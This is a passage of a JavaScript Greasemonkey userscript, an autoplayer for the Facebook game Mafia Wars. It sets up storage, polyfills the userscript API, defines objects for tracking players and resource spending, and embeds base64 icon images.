  name: 'inthemafia',
  appID: 'app10979261223',
  appNo: '10979261223',
  ajaxPage: 'ajax_inner',     // <div> for Autoplay for parsing with logResponse(), added as inner_page sibling
  ajaxResult: 'ajax_result',  // <div> for parsing with logJSONResponse(), added as final_wrapper sibling
   presentationurl: 'http://userscripts.org/scripts/show/59820',
  url: 'http://www.playerscripts.com/rokdownloads/ps_facebook_mafia_wars_a.user.js',
  metadata: 'http://userscripts.org/scripts/source/59820.meta.js',
  controller: 'remote/html_server.php?xw_controller=',
  action: '&xw_action=',
  city: '&xw_city=',
  opponent: '&opponent_id=',
  user: '&user_id='
};

// Set the storage path
var GMSTORAGE_PATH = 'GM_' + SCRIPT.appID + '_';
if (/facebook\.com/.test(window.location.href)) {
  var profElt = xpathFirst('//ul[@id="pageNav"]//a[@accesskey="6"]');
  if (profElt && profElt.getAttribute('href').match(/id=(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }

  var profLink = xpathFirst('//div[contains(@id,"div_story_") and contains(@data-ft,"actrs")]');
  if (profLink && profLink.getAttribute('data-ft').match(/"actrs":"(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }
}

if (/mwfb\.zynga\.com/.test(window.location.href)) {
  var docUrl = document.location.href;
  if (docUrl.match(/sf_xw_user_id=(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }
}

var gvar=function() {}; // Global variables
function GM_ApiBrowserCheck() {
  var needApiUpgrade=false;
  if(typeof(unsafeWindow)=='undefined') { unsafeWindow=window; }
  if(typeof(GM_log)=='undefined') { GM_log=function(msg) { try { unsafeWindow.console.log('GM_log: '+msg); } catch(e) {} }; }

  if(typeof(GM_setValue)!='undefined') {
    var gsv=GM_setValue.toString();
    if(gsv.indexOf('staticArgs')>0) { gvar.isGreaseMonkey=true; GM_log('GreaseMonkey Api detected...'); } // test GM_hitch
    else if(/not\s+supported/.test(gsv)) { needApiUpgrade=true; gvar.isBuggedChrome=true; GM_log('Bugged Chrome GM Api detected...'); }
  } else { needApiUpgrade=true; GM_log('No GM Api detected...'); }

  if(needApiUpgrade) {
    GM_log('Try to recreate needed GM Api...');
    GM_log('Using [' +  GMSTORAGE_PATH  + '] as storage path.');
    var ws=null; try { ws=typeof(unsafeWindow.localStorage); unsafeWindow.localStorage.length; } catch(e) { ws=null; } // Catch Security error
    if(ws=='object') {
      GM_log('Using localStorage for GM Api.');
      GM_getValue=function(name,defValue) { var value=unsafeWindow.localStorage.getItem(GMSTORAGE_PATH+name); if(value==null) { if (defValue==null) { return 'undefined'; } else { return defValue; } } else { switch(value.substr(0,2)) { case 'S]': return value.substr(2); case 'N]': return parseInt(value.substr(2)); case 'B]': return value.substr(2)=='true'; } } return value; };
      GM_setValue=function(name,value) { switch (typeof(value)) { case 'string': unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'S]'+value); break; case 'number': if(value.toString().indexOf('.')<0) { unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'N]'+value); } break; case 'boolean': unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'B]'+value); break; } };
      GM_deleteValue=function(name) { unsafeWindow.localStorage.removeItem(GMSTORAGE_PATH+name); };
    } else if(!gvar.isOpera || typeof(GM_setValue)=='undefined') {
      GM_log('Using temporarilyStorage for GM Api.'); gvar.temporarilyStorage=new Array();
      GM_getValue=function(name,defValue) { if(typeof(gvar.temporarilyStorage[GMSTORAGE_PATH+name])=='undefined') { return defValue; } else { return gvar.temporarilyStorage[GMSTORAGE_PATH+name]; } };
      GM_setValue=function(name,value) { switch (typeof(value)) { case "string": case "boolean": case "number": gvar.temporarilyStorage[GMSTORAGE_PATH+name]=value; } };
      GM_deleteValue=function(name) { delete gvar.temporarilyStorage[GMSTORAGE_PATH+name]; };
    }
    if(typeof(GM_openInTab)=='undefined') { GM_openInTab=function(url) { unsafeWindow.open(url,""); }; }
    if(typeof(GM_registerMenuCommand)=='undefined') { GM_registerMenuCommand=function(name,cmd) { GM_log("Notice: GM_registerMenuCommand is not supported."); }; } // Dummy
    if(!gvar.isOpera || typeof(GM_xmlhttpRequest)=='undefined') {
      GM_log('Using XMLHttpRequest for GM Api.');
      GM_xmlhttpRequest=function(obj) {
        var request=new XMLHttpRequest();
        request.onreadystatechange=function() { if(obj.onreadystatechange) { obj.onreadystatechange(request); } if(request.readyState==4 && obj.onload) { obj.onload(request); } };
        request.onerror=function() { if(obj.onerror) { obj.onerror(request); } };
        try { request.open(obj.method,obj.url,true); } catch(e) { if(obj.onerror) { obj.onerror( {readyState:4,responseHeaders:'',responseText:'',responseXML:'',status:403,statusText:'Forbidden'} ); }; return; }
        if(obj.headers) { for(name in obj.headers) { request.setRequestHeader(name,obj.headers[name]); } }
        request.send(obj.data); return request;
  }; } }
}
GM_ApiBrowserCheck();

// Handle Publishing (check for FB publishing iframe)
function checkInPublishPopup() {
  if (xpathFirst('//div[contains(@class,"aid_' + SCRIPT.appNo +'")]') &&
      /connect\/uiserver/.test(window.location.href)) {
    setGMTime('postTimer', '00:10');
    window.setTimeout(handlePublishing, 3000);
    return true;
  }
  return false;
}

function fetchPubOptions() {
  copyMWValues(['isRunning', 'autoGiftSkipOpt', 'autoLottoOpt', 'autoSecretStash',
                'autoIcePublish', 'autoLevelPublish', 'autoAchievementPublish',
                'autoAskJobHelp', 'autoShareWishlist', 'autoWarRewardPublish',
                'autoWarResponsePublish', 'autoWarRallyPublish', 'autoWarPublish']);
}

function managePopups() {
  // Refresh the publishing options
  fetchPubOptions();
  // Handle more popups that just show up out of nowhere
  handlePopups();
  window.setTimeout(managePopups, 3000);
}

// Load the iframe
function checkLoadIframe() {
  var iFrameCanvas = xpathFirst('//iframe[@name="mafiawars"]');
  if (iFrameCanvas) {
    setFBParams();
    window.location.replace(iFrameCanvas.src);
    return true;
  }
  return false;
}

// Register debugOnOff with Greasemonkey
if (gvar.isGreaseMonkey) {
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Turn Debugging Log On/Off', debugOnOff);
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Clear Saved Values', function() { clearSettings(); loadHome(); });
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Display Stats Window', function() { toggleStats(); });
}

//
// Define Spend object and methods.
//

// Constructor for Spend objects.
function Spend(name, spendFlag, startFlag, keepMode, keepValue,
               useMode, useValue, icon, burnFlag, lastFloor, lastCeiling) {
  // Initialize GM name containers
  this.name = name;
  this.spendFlag = spendFlag;
  this.startFlag = startFlag;
  this.burnFlag = burnFlag;
  this.keepMode = keepMode;
  this.keepValue = keepValue;
  this.useMode = useMode;
  this.useValue = useValue;
  this.lastFloor = lastFloor;
  this.lastCeiling = lastCeiling;
  this.icon = icon;
  this.canBurn = false;

  // Calculate the spend limit
  this.getSpendValue = function (maxVal, spendMode, spendValue) {
    switch (parseInt(spendMode)) {
      case SCHEME_PERCENT: return Math.round(maxVal * parseInt(spendValue) * .01);
      case SCHEME_POINTS: return parseInt(spendValue);
    }
  };
}

// Update the upper and lower limits of spending
Spend.prototype.refreshLimits = function (maxVal, canLevel) {
  // Subtract one or else spending will never run.
  this.floor   = Math.min(this.getSpendValue (maxVal,
                                              GM_getValue(this.keepMode, 0),
                                              GM_getValue(this.keepValue, 0)),
                          maxVal - 1);

  // The max value is the limit for ceiling
  this.ceiling = Math.min(this.getSpendValue (maxVal,
                                              GM_getValue(this.useMode, 0),
                                              GM_getValue(this.useValue, 0)),
                          maxVal);

  // Check if burning is enabled
  this.canBurn = isGMChecked(this.burnFlag) && canLevel;
};

// Toggle spending accordingly and log changes
Spend.prototype.toggleSpending = function (maxVal, curVal) {
  // Log any change to the floor.
  if (this.floor != GM_getValue(this.lastFloor)) {
    GM_setValue(this.lastFloor, this.floor);
    if (this.floor > 1) {
      addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> ' + this.name +
               ' is set to keep above <strong>' + this.floor + '</strong>.</span>');
    }
  }

  // Log any change to the ceiling.
  if (this.ceiling != GM_getValue(this.lastCeiling)) {
    GM_setValue(this.lastCeiling, this.ceiling);
    if (this.ceiling > this.floor) {
      addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> ' + this.name +
               ' refill level set to <strong>' + this.ceiling + '</strong>.</span>');
    }
  }

  // Determine whether spending needs to start or stop.
  if (curVal >= this.ceiling && !GM_getValue(this.startFlag)) {
    GM_setValue(this.startFlag, true);
  } else if (curVal <= this.floor && this.ceiling > this.floor &&
             GM_getValue(this.startFlag)) {
    GM_setValue(this.startFlag, false);
    addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> Refilling ' + this.name +
             ' to <strong>' + this.ceiling + '</strong>.</span>');
  }
};

//
// Define Player object and methods.
//

// Determine whether two player objects refer to the same player.
Player.prototype.match = function(player) {
  if (!player) return false;
  if (this.id && player.id)
    return (this.id == player.id);
  if (this.profile && this.profile == player.profile)
    return true;
  if (this.profileAttack && this.profileAttack == player.profileAttack)
    return true;
  if (this.attack && this.attack == player.attack)
    return true;
  return false;
};

// Update this player object's properties with the properties of another.
Player.prototype.update = function(player) {
  if (!this.match(player)) return false;
  for (var prop in player) {
    this[prop] = player[prop];
  }
  return true;
};

// Constructor for Player objects.
function Player(name) {
}

//
// Define PlayerList object and methods.
//

// Get this player list's array of player objects.
PlayerList.prototype.get = function(forceRefresh) {
  if (this.name && (forceRefresh || !this.list.length)) {
    // Load the list from storage.
    var ids = getSavedList(this.name);

    // Convert the ID list (strings) into a player list (objects).
    this.list = [];
    for (var i = 0, l=ids.length; i < l; ++i) {
      var p = new Player();
      p.id = ids[i];
      this.list.push(p);
    }
  }

  return this.list;
};

PlayerList.prototype.set = function(list) {
  if (list) {
    this.list = list;
  }

  if (this.name) {
    // Build an array of player ID's.
    var a = [];
    for (var i = 0, l=this.list.length; i < l; ++i) {
      var player = this.list[i];
      if (player && player.id) {
        a.push(player.id);
      }
    }

    // Store the list.
    setSavedList(this.name, a);
  }
};

PlayerList.prototype.add = function(player, max) {
  if (!player) return false;

  // If the player is already in the list, just update it.
  var l = this.list.length;
  for (var i = 0; i < l; ++i) {
    if (this.list[i].update(player)) {
      return false;
    }
  }

  // No match. Just push it into the array.
  this.list.push(player);

  // Shorten the array if it has become too large.
  if (max > 0) {
    while (max < this.list.length) {
      var playerItem = this.list.shift();
      DEBUG('Removed player ' + playerItem.id + ' from ' + this.name + '.');
    }
  }

  return true;
};

PlayerList.prototype.remove = function(player) {
  if (!player) return false;

  // If the player is in the list, remove it.
  var l = this.list.length;
  for (var i = 0; i < l; ++i) {
    if (this.list[i].match(player)) {
      this.list.splice(i, 1);
      return true;
    }
  }

  // No match.
  return false;
};

PlayerList.prototype.indexOf = function(player) {
  var l = this.list.length;
  for (var i = 0; i < l; i++) {
    if (this.list[i].match(player))
      return i;
  }
  return -1;
};

PlayerList.prototype.debug = function() {
  var l = this.list.length;
  var str = 'PlayerList name=' + this.name + ', length=' + l + '\n';
  for (var i = 0; i < l; ++i) {
    var p = this.list[i];
    str += i + ': id=' + p.id;
    if (p.name) str += ', name=' + p.name;
    if (p.level) str += ', level=' + p.level;
    if (p.mafia) str += ', mafia=' + p.mafia;
    str += '\n';
  }
  return str;
};

// Constructor for PlayerList objects.
function PlayerList(name) {
  this.name = name;
  this.list = [];
  this.get();
}

//create data uris for mini icon usage
var searchIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACLElEQVR42mNkgIJ12/cacLCzlTIwMtkwMzNx/Pnz58qfP3/n+Ls5LGfAAxhBxMZdBxKFBflnqirKs4oKCTAwMjIyfP/xk+HmvYcMj54+X/n9x4/o' +
    'CD+Pv1gNWLVlp6GYiMhJQ20NVm4uDoTMfwaGf///MZy5fIPh9Zs3tf5uji1YDdi67/BSaUnJKDUFGQYmJiaw7SDd//79Z/j77x/Di9fvGO4+ePTh4+fP4mE+br8wDNh+4OhDTRVlOUF+XgYOdlaIAUDbQZp//vrN' +
    '8OrtB4b3Hz8yPHzy1BhowDkMA3YePPZCR0NNnJebk4GdlRXsiv9A+PfvP4Yv374zfPryjeHdhw+gsLAK9nQ+js0Lewy1NZ15ebgYWFlYGFiYmcDO//P3L8M3YEB+/faD4eHTp3+ePH8pFuXv+R7DAGD0hasoyK1Q' +
    'lkeEwf//EBf8+PWL4e37jwy37z9Y7uNsF4UvGherKcnHyEtLMjAzM4MNALng5Zt3DM9fvWa4/+BhSWyIfy9OAxav28LEy81VwsvDUyolLioCcsW7Dx9/vf/4adWLl6+vXzt/qmXz+rWHGJmYfG7evPkFwwAYmL96' +
    'IwsTI6MG0BXsQFfcjg3y+QQSNzO3OMzLL2Dz9OH9o0A/ety4ceMLVgNwAR1tbT5efv4dXDx8lk8fPTgKFPIEGvKZaAMghmgBDRHAMIRoA3AZQpIBUEN4gYbsBBny8O7tvSQbAA0TXg4u7g2fP33YBwCb9/irlkMH' +
    '+QAAAABJRU5ErkJgggo=' +
    '" />';

var lootbagIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEwAQANU/AGtsbqeoqpKTk1FRU05OT0lJS2RkZVtbXM7P0Tc3N5+gonR1d0A/QGBgYldXWGdpajw7PEVERbGxsmRlZ4+PkJCRk3Bxc31/gV1fYGJiZF1dX1RUVdHS1Hp8fjo5OkJCRFBQUUdHSD8+P7S1' +
    't2JjZXRzdcbIyY6QknZ4en+Bg7S3uYOFiIqLjExMTLm6vIGDhmZnaL6/wVBRU3p6e5mbnZaXmWlqbJqanGprbauusERCRDU0NFlZW25wckFAQVJSUiH5BAEAAD8ALAAAAAATABAAAAbgwJ/QQBmNBDODcMn88WoI' +
    'ScnnKFFuNWXTQctNfDAJZ8xxKRaNw/JS2fhQqpgJoXD4GhTKwVEYoAw+EzUKAQEHYDEsLTsJEBAREzw+ACksbT4WARs7jB4QPjoEET4HFgsAPjwni50QDA0hD5IEIRuSBgCcCZ4MHwsFsoE9GW4gDq29ER0twRM9' +
    'zz4gAwmNyQUdBM3PPakkjSIfESHX2TA+ONvdECI+4gUEHQMaDT49Ky8LqQbsETINz8R+DGihAcCCC3e+OLBg48AAaQOa8PiiYcIHAu+kNWkywAGGdxGbBAEAOw==' +
    '" />';

var playIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAMQAAAAAAP///4i1GpXCHJO/G5C9G4u4Goq2GpnGHZTBHI26G4eyGpzJHa3aIafVIKfUIKHOH5/NH6vYIaTSILPgIq7bIbLfIrHeIv3++f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABkALAAA' +
    'AAAQABAAAAVqYBZB0+NITVpdl0VRDDOWZ9qsLYXEs4mqLMtgJyP5bCtLYsjDYI5AwpLofNZUBSmzav01FNkpt5sygLVjGspgDnN7p8OhTajyjA45G+xkFksLAnpnU3cTC4GDYX4jiIlzhIwZjoKQizsZIQA7' +
    '" />';

var infoIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAALISURBVDhPjZPdS1NhHMc3DCmMCKRbJaQI1Jus64K6' +
    'iQqS/oCSbr3yQnyZrSa+dKEDXyAhvFDRtqaQIakzB3sxdcPt1Dbnyzan29nmXM1tZ+fMs3O+PWezC7XAA7+L5/B8Pt/n95zfkctOPQYDLopisjyX48qLilBydHQkY5g0I4p8IJO5Eqiru86dZo7XkO/uitVra9zY' +
    '9jZH0TSXiERYnqYZPhBIJVZXaUqnWxubmVmvJoD8hARAsdstdASDfFIQAKlYLgdqMw4HqWQqh3gciEQAo9F/ODFhbtdqncV5CYHlNhteHhwI3F+Y5wEztY/KZzpU1epgsu8jGgX29oCdHQHLy2G2t3f0hcTKLJZs' +
    'lc/Hu8kinyzBLAuQrjG+EMLQlwDivwSEw0AgAGxuShJgctLmUigGKmUmE/M0FuNZUQRyuQLMZoDhBRpvNF506vzw7x0hFAL8fsDjAZxOwGLxZlSq/ieyxcWD59EoOb3UN4FTKSDDkITlOO4qHLjf/hNuL5dP39oq' +
    'wHa7iKWlTb6tradWNj1N3/P7mShDIAk+PCzUNp1FjdKD2689oDay8PkK6RQFbGxILVi8TU1tNTKHQywxGMLv4/EskkkgkSAiIvhEcah4F0ZFdwQT37Pwkt6ldOkOrNaQqFB0Nmu12qL8l9DrQ2Um066dtJIXpH8D' +
    'j7UsSvvTKB1I49E4C+86QMKIII7BwY/f1Gr11ROzYDTS17TaVZXVGvR51mM87UshtsMhuMXBv0FmwgHYbALMZhfT0tJV+89pNBgMF8bHV+5oNEuvpqZWPpCaHhmZM+n1W2mrVSB3kMPw8Ge7SqW68Z9xPvtaqey7' +
    'pdNZfrhcWczOUrnGxta6c8PSxtbWrofz887Y3JxL6Orq0/T09Fw6r0De3T1U1tEx+FWtHnXU1zfWK5UDl88LS/vygubmtw8aGhpunvkDj01/AJKaSKGsr24+AAAAAElFTkSuQmCC' +
    '" />';

var attackIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AKJRAP/LNP/dNP/KIv2uAMmHAOyXAP/pfP/eQ7VkAfisAEA8LOWNAP+9CkgkDeejAIhIA92OAP/ODmtEDf/EAf+9ADErHF02Df/PE/y3ALVrAGMyCv/mhk9LLyccFhsYGf/TJaeRO9PCav/f' +
    'YqeWLP/UE//hRv+0DvC6QqeDDrWiHPecAP/GCtGeAoVXCvDcXKebSdOwWLF3CP/ic//sdvWnAIRuDWMtB3toDXYuAnU/CqJgAm9KDXBZDXtrLf///yH5BAEAAD8ALAAAAAANAA0AAAZ3wJ+wAxP+FiqjkkY6vnBK' +
    '48HkEwl6xo4UIUCUbEJLaMbhjEASTBrd+qUGgQGLQs8UIB6hb9Co+CsPOx9CCzEBDRmJCg8FPEcoJzU1BAQ1ERo7Gi4yExc8BgYMEQk3Dg4bSisJEAkADlFCDDkfF66wFgl5PzqoQkEAOwo=' +
    '" />';

var defenseIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AFFzrH2m60V0ukhrpazH/CQ0TYuv8U19yVeK3Cc7Wl+Q4F2O3S1MfFCAzBgdJRsjMjtinj9loVp4r22a52aFvzlPdIGYwk2AzneUzVN/x2iDt8ja/ZS29mOAtT9dj9Pi/jFShI6hxHef6G2N' +
    'x0VdiDlLaePs/rrR/SxEaaWwxYCh4lWH1198slqJ1mN5oqLA93uSv05ihUJkm0JusF+IyzRdm22b6DdfnGWV5HSg7YKq9Hul8Iiv+K/J/M3e/v///yH5BAEAAD8ALAAAAAANAA0AAAZ4wJTp4ysaiwRMaHPqOZ9O' +
    'lcZC4PCu2OuoA3txdOAwmMJycQy7tHonkkhiBkNuTs/hAKRSIDCx+f0TNAAVDjiGh4YKAAMFPx4tCwqSCgsZAzI/Pw8HDSsInw0REQmZPygzAgcXAhAQDKWZCTezswwOsJkPDDUgjaVBADsK' +
    '" />';

var closeButtonIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var updateGoodIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+ro' +
    'KUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63' +
    'otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSO' +
    'ixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQr' +
    'zSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC' +
    '" />';

var pausedMessageImage = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAOAAAAAaCAYAAACuJFCeAAAAAXNSR0IArs4c6QAAFUBJREFUeNrtXHmUVcWd/uq+1/2abuimabohNIoedfQ4J4K4EI2OC1lm0FEmBh0wEkVFMo7GYHI8QYUwrSGbtAnJETWEwTVE' +
    'yWQCRGMSgyK7oiBi3Gh6ofd+3f2Wfsu9t77549V9r+59972GYDLnIHVOnV5q+9VXv6/qV1W/ugLHw7CB5EIAVQAqAAQA2ABiAPoAdAohnjuO0vHgozezAIwHUANgJIAgAAvAEICoEOKHokjhs1WhcgClSvEEAAnA' +
    'BJAAEBdC7PyYhD1XKXiZEhRK2KRq5/WjrP881Z8RAEKqjQAAQ0Wh/R5UfS5XZSrVzzKVbioC9gJoB9AqhHjhGFemswCMUmMUAlCi4afrkVQTlKnGbkgI8donkHz/AuAEABMAjFXYBQEQQApAHEA8WKDwNABjAIxW' +
    'BR1SCAVuWlUwSPKfhBCvHqWwFwGoVqtMuRpcqEEcUu1c9NcOJMmLtf44RCpVfTI8MaBiqco3Qsk0Qv0Pqv9l6ncHzGNZmaaoWXyMmozKNRI6uEEpl0PAlJqkoyRnCCF+9wnjYLXCa6xGwFJtYUkBSAYLFB4LYJwC' +
    'vUopnwO2A24MQL9KO9rgzBKj1QyrK3ocwMBRtuPUryuQTsCAh4RBbRUMqVgKIc7xaOZaTdGO5VCl8KtTGI7SJrGARkAo/bDU2A0BiADoJ3mdEGLtJ4iAtSqOhRDXefTmTYWRlUdA0zQ/b9t2bSAQGAegFnPmfA7P' +
    'PvtpV6avfGU/nnxyq2PSkbxJCLH6KIQ9UZF9NIRY4BF2pRrw8qOsfyyAaghxa8FcZWUSNTVpTJ0ax2239eGKK5KKiI655Q1jlKKZx7gyVaoZvRZC3F8wVyhko6YmhbPOGsAttxzANde0AogqAleSvFUI8fgnhIDj' +
    'FQHHFFgdJQCZtwe0LOtaIcSJhmFMkKnUOGPChC8hHC5zZaqpSaGj408oKRkAEAYQFkIsITlfKaRU5og3CJ89VqVa+aoBjIIQV3sI+L9qEPvVShhRM2tazbZ6W0Jb0Zz6q1TdGRNXiCsOG8Jbb43iscci2VleiDqP' +
    'bLvUQUw3gB6FRUztfSwlHzX5+LewED2/UzMFKYR4juSXtb2aE+kxGbNmkdq37dJM0H9X+5mJEOLOw5Zszpw2PP30HjVmg9r4xVRbJgDbtm3pKKRt2zIUCv3KsqxZgUBA+Mit69Jfg4+zT3WiLYT4H9XPf/Oxhrx1' +
    'OXhJIcSvVblrlUVQofS5RlmQdQBqIMR5Hr3pceRwdaKnp+eKMWPGTAQwyTCMCXjiiTPx1a+e59utX/7yPVx33SEN3JgyxcwiBNT3WSXKrKxQK2lmlRPiAo+w25xTI9VGXGvHIaC3DX0PV6HqHgVgJIQ431N/CwAD' +
    'pimweXMIN95YjdbW3Gr36KNxzJ9vZYZcVHnKvqf6P6BiVMmX9iHg35KE8NQvPT+FjxLrSuiYjAnVh4gi4StKwW5SVsSJEGKeB4OPFH4GXn01hBtvHIu2tpxl1djYhLvuala4OPgMKQJaUkrbMAxbSqnLQ8MwIKU0' +
    'DMMQzs8jJF4hjLwTj65D+hmA4dOWi4AatiVqm+Ic2jmT/mg16Z/uwSziO4tYljVLCHGyQ0B+8YsXiZdeGgsAmDTJhBACBw9mwL3yyijWr29SYDqkcBSvGAGFRkD9oKMMQAhCnOER9i/azJxQP3UFL0TAoM9BSghC' +
    '/IOn/l4X2Bs3luDKK0dm0889V2LXrqQiYLmnbJtzGqxhkNQmh/8vAurk060D4aNIlnZiGVOTaRjAoBBigyLgAgCTFAHneDBo107IgfXrS3DVVdXZ9MmTk3jrrQ8945dyxlBm2OWMo5RS0iEgACGlzK6Azv8+Rnxs' +
    'jfTeBaIYAaUPaUMaCR0iVqhFZaIHs+yZQdDH1q8CUMWOjjHYtKkmm3LDDSkIIdDQkCnz0ksj0dtbjbFjy1Rj6aziCXGhp8HNWQUQ4rOetP0ASiDEab6w5RNyT7ad7dvL8NBD47FjRyW6u0Mggbq6NC64IIq77+7G' +
    'tGmWRvRS7XTVtXNxAX3ppW7Q333XKLD/gyJ2ZrXdvr0aTz5Zji1bynHgQBnicQMjRkjU1ydw2WX9WLy4DRMmmACIyZOnYO/e3Go6b14rVq06kP170aKJWLbslOzfZ5wRxbvv7na1vHfvCPzwh/XYsmU0OjvLYFkC' +
    'tbUpXHJJGEuWtOD00xMeAgJCfM6D5Xo0NNTjiSdOQmtrJdLpAKS8TxEkpeUManthb9CvqAQuv9yd+sEHIQCV2L59NJ5+egQ2bx6BAwdCDj6Gg8/997egvj5lGAZJOqavMAKByz0yv6L155KCaQDws5/VYc2a8Xj/' +
    '/ZGIxYIIhWycdNIQLrxwAHPnduLiiyO+W5g9e8rxox+diC1bqn2wbVbYugmYTpdg8eIT8cwzdejqKkV9vYVbb03gnnv8zgcCeeS2LGumbdsLbdteIaX8DR944AABEiANg2xqGmBTU4SGwez/GxujJNtJtpBsIvkh' +
    'yfez6U4k31XxLz5pbSQ78v5fKJIHSX7ExsYuBoOyYL5gUPLhh3uz9ZM9JMM+9cVdMRYbcqVXVJBkimTKp2yEZJhk97Byjxtn8sCBD0i+w7VrW1xpEyakSb6TjRdfHHWlNza2u9JXrmxjKFS47yNHWtyw4QDJvST3' +
    'ZKM33+zZ7T59WkLya2pf4xDhTpIPkXzeJ3+Y5CDJKMkoYzG37OXlkmTPsPjU1aX50Ud/kVK+reTeK6V826e9HA7F0u6/v/MwdGkPybdc8ZFHWg4D2480XPeSfIdXXx3xzT9vXtqnXdOJOgHn2rb9Hdu2/1tK+Qd5' +
    '5plxp4C85BJTKVuMl15qZSs6+2yLZD/JPpLdJDvzyCSEQ7JDJA/5CNOn6oiQjPqkx1TagBrsHm7aFHZNBJ/+dJpNTV1sbu7iWWelXRPHq68OqrIZ+fPrH1IxQ8CNGxOu9HPPtUkmSSYLlM3IN326yeeei7Cjo5em' +
    '2cW2ti4uWOBu74YbYiTbaNttPOMM98Bs3txNso2JxCGWlUltwCUHB9tItpJs5datXQwEcuXq6y3u3t3Jzs5DPP/8nIxVVTZbW9tINqtJ66CvMv3kJ/vZ2/sCySdJNpL8Nsmb1YGEQ8A7FAHX+WAwkB07MpaH3znn' +
    'WCQHOH26yeefj7Kjo28YfFpcMV+XWrMxX5Zc2vjxlitt3boeJpNtbG09xFWrejltWtKFDXmQW7a0+2Dbwc7OtiLYtvCpp/pcbU2ebLG5Ocrm5jinTLF95LScmLu8se07bdtulFKuk9u3v+kqsHp1XCnaENescSvO' +
    '3r1DagAcRe93pQcCDsnCBVagqFL+IZIJn/SERpAoyQivusotw4YN0Wz9Gza4SXz11aaSPdOG/woYo2lG+MorMU6a5AbssceSRcomlXxxbaLI4TA0NODKP3GinZVz9Wq38t1xR4JkmC++GPHMoEmSvdk4c6Z7JV61' +
    'KppN27TJ3d5ddw2piTEzOXrlf/jhJinln0mus237UZL/Zdv27SRnkfyCRsD/IPmjIivgAE1zkK+8Ei+AX0SLOj79Pvj0uGK+LuWwyJcll1ZS4k5bvjzGffv6mU73etrozsaZM5NHiG0PyV5On+7Wx40bHX1N8He/' +
